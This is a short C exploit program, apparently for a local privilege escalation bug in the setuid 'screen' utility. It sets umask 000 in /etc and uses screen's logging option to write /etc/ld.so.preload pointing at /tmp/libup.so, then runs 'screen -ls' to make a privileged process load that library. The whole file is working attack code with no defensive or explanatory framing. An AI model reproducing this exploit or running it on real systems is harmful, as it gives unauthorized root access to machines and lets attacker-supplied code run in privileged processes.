#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>


int main(int argc, char **argv)
{
    /* Create the ld.so.preload file using the bug */
    chdir("/etc");
    umask(000);
    system("screen -D -m -L ld.so.preload echo -ne \"\x0a/tmp/libup.so\"");
    /* Trigger the library load and change the mosdef updated permissions */
    system("screen -ls");
    
    return 0;
}
